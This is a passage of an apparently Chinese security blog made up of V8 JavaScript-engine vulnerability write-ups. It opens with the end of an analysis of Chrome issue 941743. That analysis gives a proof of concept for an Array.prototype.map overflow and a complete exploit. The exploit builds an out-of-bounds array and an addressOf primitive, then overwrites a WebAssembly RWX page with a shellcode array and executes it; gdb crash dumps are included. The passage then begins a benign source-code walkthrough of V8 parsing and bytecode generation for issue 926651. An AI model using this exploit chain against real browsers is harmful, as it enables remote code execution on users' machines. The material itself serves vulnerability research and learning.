properties: 0 - elements kind: DICTIONARY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x3427e3982fc9 &lt;Map(HOLEY_ELEMENTS)&gt; - prototype_validity cell: 0x3538bdb00609 &lt;Cell value= 1&gt; - instance descriptors (own) #1: 0x1e11fad11e69 &lt;DescriptorArray[1]&gt; - layout descriptor: (nil) - prototype: 0x1e11fad11081 &lt;JSArray[0]&gt; - constructor: 0x1e11fad10e31 &lt;JSFunction Array (sfi = 0x3538bdb0ac69)&gt; - dependent code: 0x342395d802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0\n当JSCreateArray返回的是Dictionary类型时，V8的优化代码仍然是以数组连续的方式写值的。在就导致了数组溢出。\nPOCArray(2**30);function opt(a) &#123;   return a.map((value,index)=&gt;&#123;return value&#125;);&#125;var a = [1,2,3,,,,4];for (var i=0;i&lt;0x20000;i++) &#123;   opt(a);&#125;a.length = 0x2000000;a.fill(1,0);a.length += 0x66;//溢出opt(a);\n调试过程，报了Segmentation fault.错误，这是因为越界写，超过了可访问的区域。\nThread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.0x00000d833f382f6a in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────── RAX  0x2c9f5e100139 ◂— 0x210000242e4080a9 RBX  0x2c9f5e100159 ◂— 0x352a634016 RCX  0x2000066 RDX  0x7fc28f74a0bd ◂— &#x27;end - start &lt;= kHandleBlockSize&#x27; RDI  0x7ffc6bfa0c48 —▸ 0x2c9f5e100139 ◂— 0x210000242e4080a9 RSI  0x34218f8017d9 ◂— 0x352a63400f R8   0xffd3 R9   0xae2d8a02b31 ◂— 0x210000242e40802e R10  0x100000000 R11  0x242e40802e89 ◂— 0x40000352a634001 R12  0x1 R13  0x55715eb87e50 —▸ 0x352a63400751 ◂— 0x5a0000352a634004 R14  0xffd3 R15  0x6 RBP  0x7ffc6bfa0d18 —▸ 0x7ffc6bfa0d80 —▸ 0x7ffc6bfa0da8 —▸ 0x7ffc6bfa0e10 —▸ 0x7ffc6bfa0e60 ◂— ... RSP  0x7ffc6bfa0ce0 ◂— 0x2 RIP  0xd833f382f6a ◂— vmovsd qword ptr [rbx + r14*8 + 0xf], xmm0───────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────── ► 0xd833f382f6a    vmovsd qword ptr [rbx + r14*8 + 0xf], xmm0   0xd833f382f71    jmp    0xd833f382e90 &lt;0xd833f382e90&gt;\n疑难问题我们还注意到一个细节，我们的数组是HOLEY_SMI_ELEMENTS，首先，SMI是为了满足JSCreateArray不内联的条件，而HOLEY是为了能够溢出方便控制内存，因为空洞的原因，不会对某块区域进行写，从而不至于破坏内存中其他地方，仅去覆盖我们需要的地方。\nvar a = [1,2,3,,,,4];\n另一个问题是为何要防止JSCreateArray内联，首先，我们去除开头的Array(2**30)，然后观察IR图。没内联时是这样的\n\n内联以后是这样的，因为内联多了个CheckBound，且我们触发漏洞的length显然超过这个范围，这将导致直接deoptimization bailout。\n\n\ngdb调试如下\n0x00003bbfbc0830fb in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────── RAX  0x1caece4004d1 ◂— 0x1caece4005 RBX  0x7fa156f631b0 ◂— push   rbp RCX  0x335e74882b69 ◂— 0x21000029b2ef682e RDX  0x560d0e592ac0 —▸ 0x560d0e607a30 ◂— 0x1baddead0baddeaf RDI  0x29b2ef682e89 ◂— 0x400001caece4001 RSI  0x3a04229817d9 ◂— 0x1caece400f R8   0x2000066 R9   0x200006600000000 R10  0x100000000 R11  0x7fa156b61270 (v8::internal::IncrementalMarking::RetainMaps()) ◂— push   rbp R12  0x7fffe6d138b0 —▸ 0x7fffe6d138d8 —▸ 0x7fffe6d13940 —▸ 0x7fffe6d13990 —▸ 0x7fffe6d13cc0 ◂— ... R13  0x560d0e588e70 —▸ 0x1caece400751 ◂— 0xde00001caece4004 R14  0x1caece4005b1 ◂— 0xff00001caece4005 R15  0x7fffe6d13810 —▸ 0x3bbfbc08304a ◂— jmp    0x3bbfbc082e16 RBP  0x7fffe6d13848 —▸ 0x7fffe6d138b0 —▸ 0x7fffe6d138d8 —▸ 0x7fffe6d13940 —▸ 0x7fffe6d13990 ◂— ... RSP  0x7fffe6d13818 —▸ 0x3a042299f563 ◂— 0x1caece*RIP  0x3bbfbc0830fb ◂— mov    r13, 2───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────   0x3bbfbc082e48    jae    0x3bbfbc082e5c &lt;0x3bbfbc082e5c&gt;    ↓   0x3bbfbc082e5c    mov    r9, r8   0x3bbfbc082e5f    shl    r9, 0x20   0x3bbfbc082e63    cmp    r8d, 0x7ff8   0x3bbfbc082e6a    jae    0x3bbfbc0830fb &lt;0x3bbfbc0830fb&gt;    ↓ ► 0x3bbfbc0830fb    mov    r13, 2   0x3bbfbc083102    call   0x3bbfbc102040 &lt;0x3bbfbc102040&gt;\n可以看到，因为cmp r8d, 0x7ff8比较不通过导致直接deoptimization bailout了，因此JSCreateArray不能内联。\nexp通过溢出，覆盖Array的length，从而构造一个能自由控制的oob数组，然后就很容易利用了，当我们完成构造oob数组以后，我们使用throw抛出一个异常，从而可以使得map函数停止向后的迭代。\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;//使得TurboFan不会将JSCreateArray内联化Array(2**30);var oob_arr;var obj_arr;var arr_buf;var oob_arr_length_idx = 0x18;function opt(arr,flag) &#123;   return arr.map((value,index)=&gt;&#123;      if (index == 0) &#123;         oob_arr = [1.1,2.2,3.3];         obj_arr = [&#123;&#125;];         arr_buf = new ArrayBuffer(0x10);         if (flag) &#123;            /*%DebugPrint(a);            %DebugPrint(oob_arr);*/         &#125;      &#125; else if (index &gt; oob_arr_length_idx) &#123;         throw &quot;oob finished!&quot;      &#125;      return value;   &#125;);&#125;//HOLEY_SMI_ELEMENTS的数组var a = [1,2,,3];for (var i=0;i &lt; 0x10000; i++) &#123;   opt(a,false);&#125;a.length = 0x2000000;a.fill(1,0x18); //从0x18开始，为hole的在map时自动跳过,这样不至于损坏数据a.length += 0x66;try &#123;   opt(a,true);&#125; catch (e) &#123;   if (oob_arr.length &gt; 3) &#123;      print(&quot;oob success!&quot;);   &#125; else &#123;      throw &quot;oob failed!&quot;;   &#125;&#125;//%DebugPrint(oob_arr);//%DebugPrint(obj_arr);function addressOf(obj) &#123;   obj_arr[0] = obj;   return u64f(oob_arr[0x10]) - 0x1n;&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x100n;//%DebugPrint(wasmInstance);/*%DebugPrint(oob_arr);%DebugPrint(arr_buf);*/oob_arr[0x18] = i2f64(0x100);oob_arr[0x19] = i2f64(wasm_shellcode_ptr_addr);var adv = new DataView(arr_buf);var wasm_shellcode_addr = adv.getBigUint64(0,true);print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));oob_arr[0x19] = i2f64(wasm_shellcode_addr);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();\n0x03 感想通过本次实践，对于V8的知识又增加了，还得不断的学习。\n0x04 参考Array.prototype.map()把握机会之窗：看我如何获得Chrome 1-day漏洞并实现利用Chrome M73 issue 941743\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"ISSUE 926651漏洞分析","url":"/2021/08/17/issue-926651/","content":"\nISSUE 926651漏洞分析\n0x01 前置知识\n从源代码到字节码\n流程准备\nGenerateUnoptimizedCodeForToplevel\nFinalizeUnoptimizedCompilationJob\n\n\n字节码执行\n理解字节码&#x2F;虚拟机架构\n\n\n0x02 漏洞分析利用\npatch 分析\nPOC构造\nKeyedStoreIC\n漏洞利用\n\n\n0x03 感想\n0x04 参考\n\n\n\n0x01 前置知识从源代码到字节码流程准备v8执行JS的整个流程如下，JS源码经过Parser翻译为抽象语法树(AST)，然后Interpreter遍历AST语法树，生成ByteCode，ByteCode可以直接被解析执行也可以成为热点以后传给TurboFan进行JIT编译，TurboFan解优化时又可以回到字节码进行执行。上图是一个抽象的概念图，我们来实际研究一下v8的源码，使用如下代码进行测试使用\nfunction fun(x) &#123;\n   var a = 0x666;\n   if (x) &#123;\n      print(&quot;hello&quot;);\n   &#125; else &#123;\n      print(&quot;world&quot;);\n   &#125;\n   return a;\n&#125;\n\nfun(true);\nfun(false);\n%SystemBreak();\n\n首先先打印一遍AST语法树，以便后续分析时对照使用\n./d8 b.js --allow-natives-syntax --print-ast\n[generating bytecode for function: ]\n--- AST ---\nFUNC at 0\n. KIND 0\n. SUSPEND COUNT 0\n. NAME &quot;&quot;\n. INFERRED NAME &quot;&quot;\n. DECLS\n. . FUNCTION &quot;fun&quot; = function fun\n. EXPRESSION STATEMENT at 125\n. . CALL\n. . . VAR PROXY unallocated (0x55c8247ae8b8) (mode = VAR, assigned = true) &quot;fun&quot;\n. . . LITERAL true\n. EXPRESSION STATEMENT at 136\n. . CALL\n. . . VAR PROXY unallocated (0x55c8247ae8b8) (mode = VAR, assigned = true) &quot;fun&quot;\n. . . LITERAL false\n. EXPRESSION STATEMENT at 148\n. . ASSIGN at -1\n. . . VAR PROXY local[0] (0x55c8247aea98) (mode = TEMPORARY, assigned = true) &quot;.result&quot;\n. . . CALL RUNTIME SystemBreak at 148\n. RETURN at -1\n. . VAR PROXY local[0] (0x55c8247aea98) (mode = TEMPORARY, assigned = true) &quot;.result&quot;\n\n[generating bytecode for function: fun]\n--- AST ---\nFUNC at 12\n. KIND 0\n. SUSPEND COUNT 0\n. NAME &quot;fun&quot;\n. PARAMS\n. . VAR (0x55c8247b0908) (mode = VAR, assigned = false) &quot;x&quot;\n. DECLS\n. . VARIABLE (0x55c8247b0908) (mode = VAR, assigned = false) &quot;x&quot;\n. . VARIABLE (0x55c8247b09b0) (mode = VAR, assigned = false) &quot;a&quot;\n. BLOCK NOCOMPLETIONS at -1\n. . EXPRESSION STATEMENT at 29\n. . . INIT at 29\n. . . . VAR PROXY local[0] (0x55c8247b09b0) (mode = VAR, assigned = false) &quot;a&quot;\n. . . . LITERAL 1638\n. IF at 39\n. . CONDITION at 43\n. . . VAR PROXY parameter[0] (0x55c8247b0908) (mode = VAR, assigned = false) &quot;x&quot;\n. . THEN at -1\n. . . BLOCK at -1\n. . . . EXPRESSION STATEMENT at 54\n. . . . . CALL\n. . . . . . VAR PROXY unallocated (0x55c8247b0f88) (mode = DYNAMIC_GLOBAL, assigned = false) &quot;print&quot;\n. . . . . . LITERAL &quot;hello&quot;\n. . ELSE at -1\n. . . BLOCK at -1\n. . . . EXPRESSION STATEMENT at 88\n. . . . . CALL\n. . . . . . VAR PROXY unallocated (0x55c8247b0f88) (mode = DYNAMIC_GLOBAL, assigned = false) &quot;print&quot;\n. . . . . . LITERAL &quot;world&quot;\n. RETURN at 112\n. . VAR PROXY local[0] (0x55c8247b09b0) (mode = VAR, assigned = false) &quot;a&quot;\n\nd8中的Shell::ExecuteString函数是执行js的入口，它调用了ScriptCompiler::Compile函数进行脚本的编译\n        maybe_script = ScriptCompiler::Compile(\n            context, &amp;script_source, ScriptCompiler::kNoCompileOptions);\n\n跟踪该函数，它只是简单的设置参数，然后继续调用了CompileUnboundInternal函数，该函数如下:\nMaybeLocal&lt;UnboundScript&gt; ScriptCompiler::CompileUnboundInternal(\n    Isolate* v8_isolate, Source* source, CompileOptions options,\n    NoCacheReason no_cache_reason) &#123;\n...................\n  i::Handle&lt;i::SharedFunctionInfo&gt; result;\n................\n  i::MaybeHandle&lt;i::SharedFunctionInfo&gt; maybe_function_info =\n      i::Compiler::GetSharedFunctionInfoForScript(\n          isolate, str, script_details, source-&gt;resource_options, nullptr,\n          script_data, options, no_cache_reason, i::NOT_NATIVES_CODE);\n................\n  has_pending_exception = !maybe_function_info.ToHandle(&amp;result);\n  RETURN_ON_FAILED_EXECUTION(UnboundScript);\n  RETURN_ESCAPED(ToApiHandle&lt;UnboundScript&gt;(result));\n&#125;\n\n可见其调用了GetSharedFunctionInfoForScript生成函数的一些信息，我们跟进去查看\nMaybeHandle&lt;SharedFunctionInfo&gt; Compiler::GetSharedFunctionInfoForScript(\n    Isolate* isolate, Handle&lt;String&gt; source,\n    const Compiler::ScriptDetails&amp; script_details,\n    ScriptOriginOptions origin_options, v8::Extension* extension,\n    ScriptData* cached_data, ScriptCompiler::CompileOptions compile_options,\n    ScriptCompiler::NoCacheReason no_cache_reason, NativesFlag natives) &#123;\n  ScriptCompileTimerScope compile_timer(isolate, no_cache_reason);\n.......................\n  // Do a lookup in the compilation cache but not for extensions.\n  MaybeHandle&lt;SharedFunctionInfo&gt; maybe_result;\n  IsCompiledScope is_compiled_scope;\n  if (extension == nullptr) &#123;\n    bool can_consume_code_cache =\n        compile_options == ScriptCompiler::kConsumeCodeCache;\n    if (can_consume_code_cache) &#123;\n      compile_timer.set_consuming_code_cache();\n    &#125;\n\n    // First check per-isolate compilation cache.\n    maybe_result = compilation_cache-&gt;LookupScript(\n        source, script_details.name_obj, script_details.line_offset,\n        script_details.column_offset, origin_options, isolate-&gt;native_context(),\n        language_mode);\n    if (!maybe_result.is_null()) &#123;\n      compile_timer.set_hit_isolate_cache();\n    &#125; else if (can_consume_code_cache) &#123;\n      compile_timer.set_consuming_code_cache();\n      // Then check cached code provided by embedder.\n      ..........................\n        maybe_result = inner_result;\n      &#125; else &#123;\n        // Deserializer failed. Fall through to compile.\n        compile_timer.set_consuming_code_cache_failed();\n      &#125;\n    &#125;\n  &#125;\n\n  if (maybe_result.is_null()) &#123;\n    ParseInfo parse_info(isolate);\n    // No cache entry found compile the script.\n    NewScript(isolate, &amp;parse_info, source, script_details, origin_options,\n              natives);\n\n    // Compile the function and add it to the isolate cache.\n    if (origin_options.IsModule()) parse_info.set_module();\n    parse_info.set_extension(extension);\n    parse_info.set_eager(compile_options == ScriptCompiler::kEagerCompile);\n\n    parse_info.set_language_mode(\n        stricter_language_mode(parse_info.language_mode(), language_mode));\n    maybe_result = CompileToplevel(&amp;parse_info, isolate, &amp;is_compiled_scope);\n    Handle&lt;SharedFunctionInfo&gt; result;\n    if (extension == nullptr &amp;&amp; maybe_result.ToHandle(&amp;result)) &#123;\n      DCHECK(is_compiled_scope.is_compiled());\n      compilation_cache-&gt;PutScript(source, isolate-&gt;native_context(),\n                                   language_mode, result);\n    &#125; else if (maybe_result.is_null() &amp;&amp; natives != EXTENSION_CODE &amp;&amp;\n               natives != NATIVES_CODE) &#123;\n      isolate-&gt;ReportPendingMessages();\n    &#125;\n  &#125;\n\n  return maybe_result;\n&#125;\n\n可以看到，这里是对函数进行编译，首先检查是否已有缓存可用，如果没有，则开始新的编译，主要调用了CompileToplevel函数\nMaybeHandle&lt;SharedFunctionInfo&gt; CompileToplevel(\n    ParseInfo* parse_info, Isolate* isolate,\n    IsCompiledScope* is_compiled_scope) &#123;\n................\n  if (parse_info-&gt;literal() == nullptr &amp;&amp;\n      !parsing::ParseProgram(parse_info, isolate)) &#123;\n    return MaybeHandle&lt;SharedFunctionInfo&gt;();\n  &#125;\n................\n  // Generate the unoptimized bytecode or asm-js data.\n  MaybeHandle&lt;SharedFunctionInfo&gt; shared_info =\n      GenerateUnoptimizedCodeForToplevel(\n          isolate, parse_info, isolate-&gt;allocator(), is_compiled_scope);\n...............\n\n  FinalizeScriptCompilation(isolate, parse_info);\n  return shared_info;\n&#125;\n\n该函数主要进行了三个操作，ParseProgram生成AST语法树，调用GenerateUnoptimizedCodeForToplevel生成字节码，最后调用FinalizeScriptCompilation做一些后续工作。\nParseProgram ParseProgram调用了DoParseProgram来完成解析的任务FunctionLiteral* Parser::DoParseProgram(Isolate* isolate, ParseInfo* info) &#123;\n  // Note that this function can be called from the main thread or from a\n  // background thread. We should not access anything Isolate / heap dependent\n  // via ParseInfo, and also not pass it forward. If not on the main thread\n  // isolate will be nullptr.\n  DCHECK_EQ(parsing_on_main_thread_, isolate != nullptr);\n  DCHECK_NULL(scope_);\n  DCHECK_NULL(target_stack_);\n\n  ParsingModeScope mode(this, allow_lazy_ ? PARSE_LAZILY : PARSE_EAGERLY);\n  ResetFunctionLiteralId();\n  DCHECK(info-&gt;function_literal_id() == FunctionLiteral::kIdTypeTopLevel ||\n         info-&gt;function_literal_id() == FunctionLiteral::kIdTypeInvalid);\n\n  FunctionLiteral* result = nullptr;\n  &#123;\n    Scope* outer = original_scope_;\n    DCHECK_NOT_NULL(outer);\n    if (info-&gt;is_eval()) &#123;\n      outer = NewEvalScope(outer);\n    &#125; else if (parsing_module_) &#123;\n      DCHECK_EQ(outer, info-&gt;script_scope());\n      outer = NewModuleScope(info-&gt;script_scope());\n    &#125;\n\n    DeclarationScope* scope = outer-&gt;AsDeclarationScope();\n    scope-&gt;set_start_position(0);\n\n    FunctionState function_state(&amp;function_state_, &amp;scope_, scope);\n    ScopedPtrList&lt;Statement&gt; body(pointer_buffer());\n..................\n    &#125; else &#123;\n      // Don&#39;t count the mode in the use counters--give the program a chance\n      // to enable script-wide strict mode below.\n      this-&gt;scope()-&gt;SetLanguageMode(info-&gt;language_mode());\n      ParseStatementList(&amp;body, Token::EOS);\n    &#125;\n...................................\n  info-&gt;set_max_function_literal_id(GetLastFunctionLiteralId());\n\n  // Make sure the target stack is empty.\n  DCHECK_NULL(target_stack_);\n\n  if (has_error()) return nullptr;\n  return result;\n&#125;\n\n该函数主要调用了ParseStatementList函数，而该函数又调用ParseStatementListItem\ntemplate &lt;typename Impl&gt;\ntypename ParserBase&lt;Impl&gt;::StatementT\nParserBase&lt;Impl&gt;::ParseStatementListItem() &#123;\n  // ECMA 262 6th Edition\n  // StatementListItem[Yield, Return] :\n  //   Statement[?Yield, ?Return]\n  //   Declaration[?Yield]\n  //\n  // Declaration[Yield] :\n  //   HoistableDeclaration[?Yield]\n  //   ClassDeclaration[?Yield]\n  //   LexicalDeclaration[In, ?Yield]\n  //\n  // HoistableDeclaration[Yield, Default] :\n  //   FunctionDeclaration[?Yield, ?Default]\n  //   GeneratorDeclaration[?Yield, ?Default]\n  //\n  // LexicalDeclaration[In, Yield] :\n  //   LetOrConst BindingList[?In, ?Yield] ;\n\n  switch (peek()) &#123;\n    case Token::FUNCTION:\n      return ParseHoistableDeclaration(nullptr, false);\n    case Token::CLASS:\n      Consume(Token::CLASS);\n      return ParseClassDeclaration(nullptr, false);\n    case Token::VAR:\n    case Token::CONST:\n      return ParseVariableStatement(kStatementListItem, nullptr);\n    case Token::LET:\n      if (IsNextLetKeyword()) &#123;\n        return ParseVariableStatement(kStatementListItem, nullptr);\n      &#125;\n      break;\n    case Token::ASYNC:\n      if (PeekAhead() == Token::FUNCTION &amp;&amp;\n          !scanner()-&gt;HasLineTerminatorAfterNext()) &#123;\n        Consume(Token::ASYNC);\n        return ParseAsyncFunctionDeclaration(nullptr, false);\n      &#125;\n      break;\n    default:\n      break;\n  &#125;\n  return ParseStatement(nullptr, nullptr, kAllowLabelledFunctionStatement);\n&#125;\n\n该函数根据token的类型调用不同的解析函数进行解析。每个Parse函数内又调用其他Parse解析子语句，最终生成一个StatementT节点，这是一种递归下降的分析方法。解析后通过body-&gt;Add(stat);将StatementT按照顺序添加到序列中。解析完成后回到DoParseProgram函数\n     this-&gt;scope()-&gt;SetLanguageMode(info-&gt;language_mode());\n      ParseStatementList(&amp;body, Token::EOS);\n    &#125;\n\n    // The parser will peek but not consume EOS.  Our scope logically goes all\n    // the way to the EOS, though.\n    scope-&gt;set_end_position(peek_position());\n.....................\n.....................\n    int parameter_count = parsing_module_ ? 1 : 0;\n    result = factory()-&gt;NewScriptOrEvalFunctionLiteral(\n        scope, body, function_state.expected_property_count(), parameter_count);\n    result-&gt;set_suspend_count(function_state.suspend_count());\n  &#125;\n\n  info-&gt;set_max_function_literal_id(GetLastFunctionLiteralId());\n\n  // Make sure the target stack is empty.\n  DCHECK_NULL(target_stack_);\n\n  if (has_error()) return nullptr;\n  return result;\n&#125;\n\n通过NewScriptOrEvalFunctionLiteral创建了一个FunctionLiteral对象，并将body等数据包装在内，然后将其作为结果返回。返回到ParseProgram函数以后，将FunctionLiteral对象设置到info中，然后将info返回。\n result = parser.ParseProgram(isolate, info);\n  info-&gt;set_literal(result);\n  if (result == nullptr) &#123;\n    info-&gt;pending_error_handler()-&gt;ReportErrors(isolate, info-&gt;script(),\n                                                info-&gt;ast_value_factory());\n  &#125; else &#123;\n    info-&gt;set_language_mode(info-&gt;literal()-&gt;language_mode());\n    if (info-&gt;is_eval()) &#123;\n      info-&gt;set_allow_eval_cache(parser.allow_eval_cache());\n    &#125;\n  &#125;\n  parser.UpdateStatistics(isolate, info-&gt;script());\n  return (result != nullptr);\n&#125;\n\nGenerateUnoptimizedCodeForToplevel接下来回到CompileToplevel，有一点需要解释的是Toplevel的意思就是在脚本最外层的语句，如\nvar x = 1;\nprint(x);\nfuntion fun() &#123;\n    var a = 1;\n    var b = 2;\n&#125;\n\n其中在函数外面的以及functionfun()这个声明都属Toplevle，而在函数内部的则属于nonToplevel。解析函数时通过调用ParseHoistableDeclaration可以将函数中non-Toplevel部分解析。ParseProgram得到AST以后，接下来调用GenerateUnoptimizedCodeForToplevel函数生成字节码。\nMaybeHandle&lt;SharedFunctionInfo&gt; GenerateUnoptimizedCodeForToplevel(\n    Isolate* isolate, ParseInfo* parse_info, AccountingAllocator* allocator,\n    IsCompiledScope* is_compiled_scope) &#123;\n  EnsureSharedFunctionInfosArrayOnScript(parse_info, isolate);\n  parse_info-&gt;ast_value_factory()-&gt;Internalize(isolate);\n\n  if (!Compiler::Analyze(parse_info)) return MaybeHandle&lt;SharedFunctionInfo&gt;();\n  DeclarationScope::AllocateScopeInfos(parse_info, isolate);\n\n  // Prepare and execute compilation of the outer-most function.\n  // Create the SharedFunctionInfo and add it to the script&#39;s list.\n  Handle&lt;Script&gt; script = parse_info-&gt;script();\n  Handle&lt;SharedFunctionInfo&gt; top_level =\n      isolate-&gt;factory()-&gt;NewSharedFunctionInfoForLiteral(parse_info-&gt;literal(),\n                                                          script, true);\n\n该函数先是调用NewSharedFunctionInfoForLiteral函数从parse_info-&gt;literal()生成一个SharedFunctionInfo对象，并且该对象会被添加到全局的list列表中\nHandle&lt;SharedFunctionInfo&gt; Factory::NewSharedFunctionInfoForLiteral(\n    FunctionLiteral* literal, Handle&lt;Script&gt; script, bool is_toplevel) &#123;\n  FunctionKind kind = literal-&gt;kind();\n  Handle&lt;SharedFunctionInfo&gt; shared = NewSharedFunctionInfoForBuiltin(\n      literal-&gt;name(), Builtins::kCompileLazy, kind);\n  SharedFunctionInfo::InitFromFunctionLiteral(shared, literal, is_toplevel);\n  SharedFunctionInfo::SetScript(shared, script, literal-&gt;function_literal_id(),\n                                false);\n  return shared;\n&#125;\n\nvoid SharedFunctionInfo::SetScript(Handle&lt;SharedFunctionInfo&gt; shared,\n                                   Handle&lt;Object&gt; script_object,\n                                   int function_literal_id,\n                                   bool reset_preparsed_scope_data) &#123;\n  if (shared-&gt;script() == *script_object) return;\n  Isolate* isolate = shared-&gt;GetIsolate();\n\n  if (reset_preparsed_scope_data &amp;&amp;\n      shared-&gt;HasUncompiledDataWithPreparseData()) &#123;\n    shared-&gt;ClearPreparseData();\n  &#125;\n\n  // Add shared function info to new script&#39;s list. If a collection occurs,\n  // the shared function info may be temporarily in two lists.\n  // This is okay because the gc-time processing of these lists can tolerate\n  // duplicates.\n  if (script_object-&gt;IsScript()) &#123;\n    DCHECK(!shared-&gt;script()-&gt;IsScript());\n    Handle&lt;Script&gt; script = Handle&lt;Script&gt;::cast(script_object);\n    Handle&lt;WeakFixedArray&gt; list =\n        handle(script-&gt;shared_function_infos(), isolate);\n#ifdef DEBUG\n    DCHECK_LT(function_literal_id, list-&gt;length());\n    MaybeObject maybe_object = list-&gt;Get(function_literal_id);\n    HeapObject heap_object;\n    if (maybe_object-&gt;GetHeapObjectIfWeak(&amp;heap_object)) &#123;\n      DCHECK_EQ(heap_object, *shared);\n    &#125;\n#endif\n    list-&gt;Set(function_literal_id, HeapObjectReference::Weak(*shared));\n.....................................\n\n接下来就是编译函数了\n  std::vector&lt;FunctionLiteral*&gt; functions_to_compile;\n  functions_to_compile.push_back(parse_info-&gt;literal());\n\n  while (!functions_to_compile.empty()) &#123;\n    FunctionLiteral* literal = functions_to_compile.back();\n    functions_to_compile.pop_back();\n    Handle&lt;SharedFunctionInfo&gt; shared_info =\n        Compiler::GetSharedFunctionInfo(literal, script, isolate);\n    if (shared_info-&gt;is_compiled()) continue;\n    if (UseAsmWasm(literal, parse_info-&gt;is_asm_wasm_broken())) &#123;\n        ..............................\n    &#125;\n    std::unique_ptr&lt;UnoptimizedCompilationJob&gt; job(\n        interpreter::Interpreter::NewCompilationJob(\n            parse_info, literal, allocator, &amp;functions_to_compile));\n\n    if (job-&gt;ExecuteJob() == CompilationJob::FAILED ||\n        FinalizeUnoptimizedCompilationJob(job.get(), shared_info, isolate) ==\n            CompilationJob::FAILED) &#123;\n      return MaybeHandle&lt;SharedFunctionInfo&gt;();\n    &#125;\n\n主要是创建了NewCompilationJob对象，然后调用ExecuteJob，实际上调用的函数是InterpreterCompilationJob::Status InterpreterCompilationJob::ExecuteJobImpl()\nInterpreterCompilationJob::Status InterpreterCompilationJob::ExecuteJobImpl() &#123;\n  RuntimeCallTimerScope runtimeTimerScope(\n      parse_info()-&gt;runtime_call_stats(),\n      parse_info()-&gt;on_background_thread()\n          ? RuntimeCallCounterId::kCompileBackgroundIgnition\n          : RuntimeCallCounterId::kCompileIgnition);\n  // TODO(lpy): add support for background compilation RCS trace.\n  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(&quot;v8.compile&quot;), &quot;V8.CompileIgnition&quot;);\n\n  // Print AST if flag is enabled. Note, if compiling on a background thread\n  // then ASTs from different functions may be intersperse when printed.\n  MaybePrintAst(parse_info(), compilation_info());\n\n  generator()-&gt;GenerateBytecode(stack_limit());\n\n  if (generator()-&gt;HasStackOverflow()) &#123;\n    return FAILED;\n  &#125;\n  return SUCCEEDED;\n&#125;\n\n该函数又调用了GenerateBytecode，而GenerateBytecode继续调用GenerateBytecodeBody\nvoid BytecodeGenerator::GenerateBytecodeBody() &#123;\n  // Build the arguments object if it is used.\n  VisitArgumentsObject(closure_scope()-&gt;arguments());\n\n  // Build rest arguments array if it is used.\n  Variable* rest_parameter = closure_scope()-&gt;rest_parameter();\n  VisitRestArgumentsArray(rest_parameter);\n\n  // Build assignment to the function name or &#123;.this_function&#125;\n  // variables if used.\n  VisitThisFunctionVariable(closure_scope()-&gt;function_var());\n  VisitThisFunctionVariable(closure_scope()-&gt;this_function_var());\n\n  // Build assignment to &#123;new.target&#125; variable if it is used.\n  VisitNewTargetVariable(closure_scope()-&gt;new_target_var());\n\n  // Create a generator object if necessary and initialize the\n  // &#123;.generator_object&#125; variable.\n  if (IsResumableFunction(info()-&gt;literal()-&gt;kind())) &#123;\n    BuildGeneratorObjectVariableInitialization();\n  &#125;\n\n  // Emit tracing call if requested to do so.\n  if (FLAG_trace) builder()-&gt;CallRuntime(Runtime::kTraceEnter);\n\n  // Emit type profile call.\n  if (info()-&gt;collect_type_profile()) &#123;\n    feedback_spec()-&gt;AddTypeProfileSlot();\n    int num_parameters = closure_scope()-&gt;num_parameters();\n    for (int i = 0; i &lt; num_parameters; i++) &#123;\n      Register parameter(builder()-&gt;Parameter(i));\n      builder()-&gt;LoadAccumulatorWithRegister(parameter).CollectTypeProfile(\n          closure_scope()-&gt;parameter(i)-&gt;initializer_position());\n    &#125;\n  &#125;\n\n  // Visit declarations within the function scope.\n  VisitDeclarations(closure_scope()-&gt;declarations());\n\n  // Emit initializing assignments for module namespace imports (if any).\n  VisitModuleNamespaceImports();\n\n  // Perform a stack-check before the body.\n  